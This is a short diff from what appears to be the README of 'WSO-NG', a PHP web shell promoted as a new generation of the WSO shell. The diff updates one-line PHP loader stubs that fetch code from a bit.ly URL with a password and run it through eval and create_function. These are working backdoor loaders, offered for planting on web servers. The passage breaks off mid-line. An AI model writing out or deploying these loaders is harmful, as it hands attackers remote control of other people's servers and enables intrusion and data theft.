@@ -8,7 +8,7 @@ New generation of famous WSO web shell. With perks included
 # changes
 - can now hook password when loaded via stub 
 ```
-<?php eval(substr(file_get_contents('https://bit.ly/get-wso-ng?pass=ed78a48738eb97ffb5624741bdf391c3'), 5)); ?>
+<?php eval(substr(file_get_contents('https://bit.ly/4avY8bi?pass=ed78a48738eb97ffb5624741bdf391c3'), 5)); ?>
 ```
 ```
 <?php $sorrymom = create_function('', "substr(implode('', file('https://bit.ly/4avY8bi?pass=ed78a48738eb97ffb5624741bdf391c3')), 5)");$sorrymom();
